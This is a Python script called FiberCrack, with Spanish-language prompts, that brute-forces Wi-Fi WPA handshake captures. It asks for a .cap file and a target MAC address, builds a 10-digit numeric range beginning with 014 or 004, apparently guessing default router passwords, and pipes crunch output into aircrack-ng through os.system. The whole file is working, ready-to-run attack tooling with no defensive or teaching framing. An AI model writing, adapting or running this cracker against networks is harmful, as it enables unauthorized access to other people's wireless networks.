#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Coded by: Ignacio Navarro
# Version: 1.2
# Date: June 11, 2020

import sys
import os
import re


class bcolors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'


def get_command(prefix, suffix):
    """
    Generate crunch command
    :param prefix: Prefix indicator(0 or 1)
    :type prefix: int
    :param sufix: Sufix indicator(Between 0-4)
    :type sufix: int
    :return: Command for Crunch
    :type: str
    """
    command = '014{}' if prefix == 1 else '004{}'
    values = ('1000000', '2000000', '3000000', '4000000', '5000000')
    command_return = command.format(values[suffix])
    return command_return


def ascii():
    print(bcolors.GREEN + "  _____ _ _                ____                _    " + bcolors.ENDC)
    print(bcolors.GREEN + " |  ___(_) |__   ___ _ __ / ___|_ __ __ _  ___| | __" + bcolors.ENDC)
    print(bcolors.GREEN + " | |_  | | '_ \ / _ \ '__| |   | '__/ _` |/ __| |/ /" + bcolors.ENDC)
    print(bcolors.GREEN + " |  _| | | |_) |  __/ |  | |___| | | (_| | (__|   < " + bcolors.ENDC)
    print(bcolors.GREEN + " |_|   |_|_.__/ \___|_|   \____|_|  \__,_|\___|_|\_\ " + bcolors.ENDC)
    print(bcolors.GREEN + "                                                    " + bcolors.ENDC +
          bcolors.HEADER + "1.1" + bcolors.ENDC)
    print(bcolors.RED + "[-] Coded by Ignacio Daniel Navarro(@ignavarro1) [-]\n" + bcolors.ENDC)


def check_params():
    if len(sys.argv) != 3:
        print(bcolors.RED + '[!] Ingrese datos validos' + bcolors.ENDC)
        print(bcolors.GREEN + 'Ej: fibercrack.py ARCHIVO.CAP MAC' + bcolors.ENDC)
        sys.exit()

    file_cap = sys.argv[1]
    mac_addr = sys.argv[2]

    if '.cap' != file_cap[-4:]:
        print(bcolors.RED + '[!] Ingrese archivo de captura valido' + bcolors.ENDC)
        sys.exit()
    if not re.match('^([0-f][0-f][:-]){5}[0-f][0-f]$', mac_addr):
        print(bcolors.RED + '[!] Ingrese una direccion mac valida' + bcolors.ENDC)
        sys.exit()

    return mac_addr, file_cap


def get_inputs():
    print(bcolors.GREEN + 'DATOS CORRECTOS' + bcolors.ENDC)
    print(bcolors.BLUE + '[?] Elija una opcion' + bcolors.ENDC)
    print('1 - 014xxxxxxx')
    print('2 - 004xxxxxxx [Por defecto]')
    try:
        start_prefix = int(input())
    except:
        start_prefix = 2
    if start_prefix not in [1, 2]:
        start_prefix = 2
    print(bcolors.BLUE + '[?] Elija el digito de Inicio' + bcolors.ENDC)
    print('1 - xxx1000000')
    print('2 - xxx2000000')
    print('3 - xxx3000000 [Por defecto]')
    print('4 - xxx4000000')
    try:
        doc_start = int(input()) - 1
    except:
        doc_start = 2
    if doc_start not in range(0, 4):
        doc_start = 2
    print(bcolors.BLUE + '[?] Elija el digito de finalizacion' + bcolors.ENDC)
    print('1 - xxx2000000')
    print('2 - xxx3000000')
    print('3 - xxx4000000 [Por defecto]')
    print('4 - xxx5000000')
    try:
        end_doc = int(input())
    except:
        end_doc = 3
    if end_doc not in range(1, 5):
        end_doc = 3
    # En caso que sea final > start_prefix
    if doc_start > end_doc:
        print(bcolors.RED + '[!] Verifique los rangos de inicio y fin' + bcolors.ENDC)
        sys.exit()
    return start_prefix, doc_start, end_doc


ascii()
mac_addr, file_cap = check_params()
start_prefix, doc_start, end_doc = get_inputs()
since = get_command(start_prefix, doc_start)
until = get_command(start_prefix, end_doc)
command_final = 'crunch 10 10 0123456789 -s {} -e {} | aircrack-ng --bssid {} -w- {}'.format(since, until, mac_addr,
                                                                                             file_cap)
os.system(command_final)
